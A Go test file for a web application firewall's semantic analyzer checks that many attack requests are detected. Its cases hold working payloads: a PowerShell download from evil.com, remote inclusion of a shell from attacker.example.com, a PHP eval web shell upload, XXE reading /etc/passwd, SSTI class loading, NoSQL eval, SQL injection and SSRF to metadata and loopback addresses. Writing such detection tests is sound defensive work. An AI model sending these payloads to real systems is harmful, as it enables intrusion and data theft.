package semantic

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestKimiGapCandidates(t *testing.T) {
	cases := []struct {
		name, method, target, ct, body string
		wantCat                        string
		bodyBytes                      []byte
	}{
		{"ps-download", "GET", "/exec?c=(New-Object%20System.Net.WebClient).DownloadFile('http://evil.com/a.exe','C:\\tmp\\a.exe')", "", "", "rce", nil},
		{"rfi", "GET", "/index.php?include=http://attacker.example.com/shell.php", "", "", "lfi", nil},
		{"data", "GET", "/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "", "", "lfi", nil},
		{"docker", "POST", "/api/v1/container?socket=/run/docker.sock", "application/json", `{"Image":"alpine"}`, "lfi", nil},
		{"eval", "POST", "/admin/db/eval", "application/json", `{"$eval":"db.users.find()"}`, "nosqli", nil},
		{"mapreduce", "POST", "/api/analytics/mapreduce", "application/json", `{"map":"function() { emit(this._id, this.password); }","reduce":"function(key, vals) { return vals.join(','); }"}`, "nosqli", nil},
		{"objectspace", "GET", "/render?tpl=<%=ObjectSpace.each_object(Class).to_a%>", "", "", "ssti", nil},
		{"classloader", "GET", `/freemarker?name=${classLoader.loadClass("Exploit").newInstance()}`, "", "", "ssti", nil},
		{"filename-sqli", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1' UNION SELECT password--.jpg\"\r\n\r\nbinarydata\r\n------WebKitFormBoundary--", "sqli", nil},
		{"webshell", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php eval($_POST['cmd']); ?>\r\n------WebKitFormBoundary--", "rce", nil},
		// Remaining kimi FNs — fixed this round
		{"ssrf-rebind", "GET", "/api/fetch?url=http://rebind.attacker.example.com/admin", "", "", "ssrf", nil},
		{"ssrf-rbndr", "GET", "/api/fetch?url=http://7f000001.rbndr.us/", "", "", "ssrf", nil},
		{"xxe-utf16", "POST", "/api/xml", "text/xml; charset=utf-16", "", "xxe", utf16LEXML(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`)},
		// Log/corpus style: binary dumped as \xNN escapes (not real bytes).
		{"xxe-utf16-hexesc", "POST", "/api/xml", "text/xml; charset=utf-16", utf16HexEscaped(`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`), "xxe", nil},
		// Expanded RCE / SSTI / XXE + 0day-shaped primitives
		{"rce-node-child", "GET", `/run?cmd=node%20-e%20require('child_process').exec('id')`, "", "", "rce", nil},
		{"rce-ld-preload", "GET", "/run?cmd=LD_PRELOAD=/tmp/evil.so%20/bin/true", "", "", "rce", nil},
		{"ssti-objectconstructor", "GET", `/tpl?n=${"freemarker.template.utility.ObjectConstructor"?new()}`, "", "", "ssti", nil},
		{"xxe-xinclude", "POST", "/api/xml", "application/xml", `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>`, "xxe", nil},
		{"xxe-param-entity", "POST", "/api/xml", "application/xml", `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd">%xxe;]><foo/>`, "xxe", nil},
	}
	a := NewAnalyzer("block")
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var bodyReader *strings.Reader
			var body []byte
			if len(tc.bodyBytes) > 0 {
				body = tc.bodyBytes
				bodyReader = strings.NewReader(string(tc.bodyBytes))
			} else {
				body = []byte(tc.body)
				bodyReader = strings.NewReader(tc.body)
			}
			req := httptest.NewRequest(tc.method, "http://x"+tc.target, bodyReader)
			if tc.ct != "" {
				req.Header.Set("Content-Type", tc.ct)
			}
			reqCtx := &engine.RequestContext{Request: req, DecodedBody: body, Metadata: map[string]any{}}
			got, err := a.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected {
				t.Fatalf("missed %s", tc.wantCat)
			}
			if got.Category != tc.wantCat {
				t.Fatalf("want %s got %s msg=%s", tc.wantCat, got.Category, got.Message)
			}
		})
	}
}

func TestKimiBadBenignLabelsStillBlocked(t *testing.T) {
	// These were labeled "benign" in kimi_search but are real attack shapes.
	// We intentionally keep blocking them (not false positives).
	a := NewAnalyzer("block")
	badBenign := []struct {
		name, target string
	}{
		{"traversal-pdf", "/docs/download?file=../manual.pdf"},
		{"encoded-traversal", "/static/asset?path=..%2f..%2fassets%2flogo.png"},
		{"shadow-scan", "/scanner/task?file=/etc/shadow&task=audit-001"},
		{"metadata", "/cloud/metadata?url=http://169.254.169.254/latest/meta-data/instance-type"},
		{"loopback-fetch", "/api/fetch?url=http://127.0.0.1/healthz"},
	}
	for _, tc := range badBenign {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "http://x"+tc.target, nil)
			reqCtx := &engine.RequestContext{Request: req, Metadata: map[string]any{}}
			got, err := a.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected {
				t.Fatalf("expected real attack shape to remain blocked: %s", tc.target)
			}
		})
	}
}

func utf16LEXML(s string) []byte {
	u16 := utf16.Encode([]rune(s))
	out := make([]byte, 2+len(u16)*2)
	out[0], out[1] = 0xff, 0xfe
	for i, c := range u16 {
		out[2+i*2] = byte(c)
		out[2+i*2+1] = byte(c >> 8)
	}
	return out
}

func utf16HexEscaped(s string) string {
	b := utf16LEXML(s)
	var out strings.Builder
	for _, c := range b {
		out.WriteString(`\x`)
		out.WriteByte("0123456789abcdef"[c>>4])
		out.WriteByte("0123456789abcdef"[c&0xf])
	}
	return out.String()
}
